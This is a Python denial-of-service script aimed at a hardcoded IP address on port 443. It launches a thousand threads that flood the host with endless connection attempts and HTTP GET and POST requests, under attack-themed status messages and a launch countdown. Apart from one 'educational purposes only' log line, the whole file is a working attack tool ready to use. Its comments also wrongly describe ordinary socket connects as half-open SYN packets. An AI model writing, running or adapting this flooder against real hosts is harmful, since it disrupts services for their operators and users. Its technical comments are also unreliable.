import sys
import socket
import threading
import time
import random
from datetime import datetime

# Configuration
TARGET_IP = "164.160.2.21"  # Your specified IP address
TARGET_PORT = 443           # Your specified port
loops = 1000  # Reduced for TCP (more resource-intensive)

def log_message(level, message, thread_id=None):
    """Log messages with timestamp and level"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    thread_info = f" [Thread-{thread_id}]" if thread_id is not None else ""
    print(f"[{timestamp}] [{level}]{thread_info} {message}")

def validate_args():
    """Validate command line arguments"""
    if len(sys.argv) != 2:
        print("Usage: python script.py <method>")
        print("Methods: TCP-SYN, TCP-Connect, TCP-Mixed")
        print(f"Target: {TARGET_IP}:{TARGET_PORT}")
        sys.exit(1)
    
    method = sys.argv[1]
    
    # Validate method
    valid_methods = ["TCP-SYN", "TCP-Connect", "TCP-Mixed"]
    if method not in valid_methods:
        print(f"Error: Method must be one of {valid_methods}")
        sys.exit(1)
    
    return method

def send_syn_flood(thread_id):
    """Send TCP SYN packets (half-open connections)"""
    connections_attempted = 0
    start_time = time.time()
    
    log_message("INFO", f"Starting SYN flood attack", thread_id)
    
    while True:
        try:
            # Create new socket for each SYN packet
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            # Send SYN packet (initiate connection but don't complete handshake)
            s.connect_ex((TARGET_IP, TARGET_PORT))
            connections_attempted += 1
            
            # Don't close socket immediately to keep connection half-open
            if connections_attempted % 100 == 0:
                elapsed = time.time() - start_time
                rate = connections_attempted / elapsed if elapsed > 0 else 0
                log_message("SUCCESS", f"SYN packets sent: {connections_attempted} | Rate: {rate:.2f} pkt/sec", thread_id)
            
            # Close some sockets periodically to manage resources
            if connections_attempted % 50 == 0:
                try:
                    s.close()
                except:
                    pass
                    
        except socket.error as e:
            log_message("ERROR", f"Socket error: {e}", thread_id)
            try:
                s.close()
            except:
                pass
        except Exception as e:
            log_message("ERROR", f"Unexpected error: {e}", thread_id)
            try:
                s.close()
            except:
                pass

def send_connect_flood(thread_id):
    """Send complete TCP connections and data"""
    connections_made = 0
    start_time = time.time()
    
    log_message("INFO", f"Starting TCP connect flood attack", thread_id)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # Complete TCP handshake
            s.connect((TARGET_IP, TARGET_PORT))
            connections_made += 1
            
            # Send some data after connection
            data = b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n\r\n"
            s.send(data)
            
            # Keep connection open for a bit
            time.sleep(0.1)
            
            if connections_made % 50 == 0:
                elapsed = time.time() - start_time
                rate = connections_made / elapsed if elapsed > 0 else 0
                log_message("SUCCESS", f"Connections made: {connections_made} | Rate: {rate:.2f} conn/sec", thread_id)
            
            s.close()
            
        except socket.error as e:
            log_message("ERROR", f"Connection failed: {e}", thread_id)
            try:
                s.close()
            except:
                pass
        except Exception as e:
            log_message("ERROR", f"Unexpected error: {e}", thread_id)
            try:
                s.close()
            except:
                pass

def send_mixed_attack(thread_id):
    """Mixed TCP attack - alternates between SYN and Connect floods"""
    attacks_launched = 0
    start_time = time.time()
    
    log_message("INFO", f"Starting mixed TCP attack", thread_id)
    
    while True:
        try:
            if attacks_launched % 2 == 0:
                # SYN flood
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect_ex((TARGET_IP, TARGET_PORT))
            else:
                # Connect flood with data
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((TARGET_IP, TARGET_PORT))
                data = b"POST / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\nContent-Length: 100\r\n\r\n" + b"X" * 100
                s.send(data)
                time.sleep(0.05)
            
            attacks_launched += 1
            
            if attacks_launched % 40 == 0:
                elapsed = time.time() - start_time
                rate = attacks_launched / elapsed if elapsed > 0 else 0
                log_message("SUCCESS", f"Attacks launched: {attacks_launched} | Rate: {rate:.2f} att/sec", thread_id)
            
            # Close socket
            try:
                s.close()
            except:
                pass
                
        except Exception as e:
            log_message("ERROR", f"Attack failed: {e}", thread_id)
            try:
                s.close()
            except:
                pass

def attack_HQ(method):
    """Launch TCP attack with specified method"""
    log_message("INFO", f"🚀 INITIALIZING TCP ATTACK SEQUENCE")
    log_message("INFO", f"📍 TARGET: {TARGET_IP}:{TARGET_PORT}")
    log_message("INFO", f"🎯 METHOD: {method}")
    log_message("INFO", f"🧵 THREADS: {loops}")
    log_message("INFO", f"⏰ START TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    print("\n" + "="*60)
    print("🔥 TCP ATTACK IN PROGRESS 🔥")
    print("="*60 + "\n")
    
    threads = []
    start_time = time.time()
    
    try:
        if method == "TCP-SYN":
            log_message("INFO", "Starting TCP-SYN flood (half-open connections)")
            for i in range(loops):
                thread = threading.Thread(
                    target=send_syn_flood, 
                    args=(i,),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
                if i % 100 == 0 and i > 0:
                    log_message("PROGRESS", f"Created {i}/{loops} threads...")
                
        elif method == "TCP-Connect":
            log_message("INFO", "Starting TCP-Connect flood (full connections)")
            for i in range(loops):
                thread = threading.Thread(
                    target=send_connect_flood, 
                    args=(i,),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
                if i % 100 == 0 and i > 0:
                    log_message("PROGRESS", f"Created {i}/{loops} threads...")
                
        elif method == "TCP-Mixed":
            log_message("INFO", "Starting TCP-Mixed attack (SYN + Connect floods)")
            for i in range(loops):
                thread = threading.Thread(
                    target=send_mixed_attack, 
                    args=(i,),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
                if i % 100 == 0 and i > 0:
                    log_message("PROGRESS", f"Created {i}/{loops} threads...")
        
        creation_time = time.time() - start_time
        log_message("SUCCESS", f"All {loops} threads created in {creation_time:.2f} seconds")
        log_message("INFO", "TCP attack is now running at full capacity!")
        
        # Monitor and display ongoing status
        monitor_count = 0
        while True:
            time.sleep(5)
            monitor_count += 1
            elapsed = time.time() - start_time
            log_message("STATUS", f"TCP attack ongoing... | Running for: {elapsed:.2f}s | Check: #{monitor_count}")
            
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print("\n" + "="*60)
        log_message("WARNING", f"🛑 TCP ATTACK INTERRUPTED BY USER")
        log_message("INFO", f"⏱️  TOTAL DURATION: {elapsed:.2f} seconds")
        log_message("INFO", f"📊 APPROXIMATE THREADS DEPLOYED: {len(threads)}")
        log_message("INFO", "All daemon threads will be terminated automatically")
        print("="*60)
        sys.exit(0)

def main():
    """Main function"""
    try:
        log_message("INFO", "🚀 TCP ATTACK TOOL STARTING UP")
        log_message("INFO", "⚠️  FOR EDUCATIONAL PURPOSES ONLY")
        log_message("INFO", "📡 ATTACKING TCP PORTS (80/443)")
        
        method = validate_args()
        
        # Final confirmation
        print("\n" + "!"*60)
        log_message("WARNING", f"CONFIRMING TCP ATTACK PARAMETERS:")
        log_message("WARNING", f"TARGET: {TARGET_IP}:{TARGET_PORT}")
        log_message("WARNING", f"METHOD: {method}")
        log_message("WARNING", f"THREADS: {loops}")
        print("!"*60)
        
        # Countdown
        for i in range(5, 0, -1):
            log_message("COUNTDOWN", f"TCP attack starting in {i}...")
            time.sleep(1)
        
        attack_HQ(method)
        
    except KeyboardInterrupt:
        log_message("INFO", "Program terminated before TCP attack started")
        sys.exit(0)
    except Exception as e:
        log_message("ERROR", f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
